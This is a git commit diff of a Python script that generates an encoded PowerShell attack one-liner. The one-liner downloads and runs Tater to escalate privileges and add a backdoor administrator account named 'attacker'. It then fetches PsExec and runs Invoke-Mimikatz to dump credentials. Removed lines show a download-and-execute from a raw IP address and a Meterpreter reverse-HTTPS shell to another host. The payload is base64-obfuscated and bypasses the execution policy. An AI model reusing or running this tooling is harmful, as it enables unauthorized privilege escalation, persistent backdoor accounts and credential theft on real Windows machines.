01e69686c147c9ff47695feb8a94884cfc496cbe
Jon <github@alleskaputt.com>
2016-09-01 10:36:11 +0200

    added mimikatz powershell

--- generate_powershell_tater.py
+++ generate_powershell_tater.py
@@ -1,22 +1,56 @@
 import base64
 
+
+
+def cmd_to_base64(cmd):
+
+	temp_cmd = ""
+	for char in cmd:
+		temp_cmd += char + "\x00"
+	base64_cmd = base64.b64encode(temp_cmd)
+
+	return base64_cmd
+
+
+
+
+
+url_psexec = "https://github.com/jbarg/windows_sec/blob/master/sysinternals_exe/PsExec.exe?raw=true"
+url_tater = "https://raw.githubusercontent.com/jbarg/Tater/master/Tater.ps1"
+url_mimikatz = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"
+
+
+
+
 command = "cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc "
-
-
+# read os proxy config
 powershell_command = "$browser = New-Object System.Net.WebClient; $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;"
-#powershell_command += 'iex $browser.DownloadString("http://92.60.14.160:8000/payload"); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 212.47.254.99 -Lport 4444 -Force'
-#powershell_command += 'IEX $browser.DownloadString("http://92.60.14.160:8000/payload"); Invoke-Shellcode'
 
-powershell_command += "IEX $browser.DownloadString('https://raw.githubusercontent.com/jbarg/Tater/master/Tater.ps1'); Invoke-Tater -Trigger 1 -Command \"net user secconsult Test123! /add\""
-powershell_command += "IEX $browser.DownloadString('https://raw.githubusercontent.com/jbarg/Tater/master/Tater.ps1'); Invoke-Tater -Trigger 1 -Command \"net localgroup administrators secconsult /add\""
+# priv esc using potato powershell port "tater"
+powershell_command += "IEX $browser.DownloadString('" + url_tater + "'); Invoke-Tater -Trigger 1 -Command \"net user attacker Test123! /add\";"
+powershell_command += "IEX $browser.DownloadString('" + url_tater + "'); Invoke-Tater -Trigger 1 -Command \"net localgroup administrators attacker /add\";"
 
-blank_command = ""
-for char in powershell_command:
-    blank_command += char + "\x00"
+# download sysinternals psexec
+powershell_command += "IEX $browser.DownloadFile('" + url_psexec + "','C:\\ProgramData\\psexec.exe');"
 
-powershell_command = blank_command
-powershell_command = base64.b64encode(powershell_command)
-command += powershell_command
+
+
+# run command as user: attacker
+admin_cmd = "$browser = New-Object System.Net.WebClient; $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;"
+admin_cmd += "IEX $browser.DownloadString('" + url_mimikatz + "'); Invoke-Mimikatz -DumpCreds"
+
+admin_cmd_b64 = cmd_to_base64(admin_cmd)
+print "Mimikatz cmd:\n\n"
+print command + " " + admin_cmd_b64
+print "---------------------------------"
+
+
+
+powershell_command += "C:\\ProgramData\\psexec.exe /accepteula -i -u attacker -p Test123! " + command + " " + admin_cmd_b64
+
+print "-------------------------------------------------"
+
+command += cmd_to_base64(powershell_command)
 print command
 
 
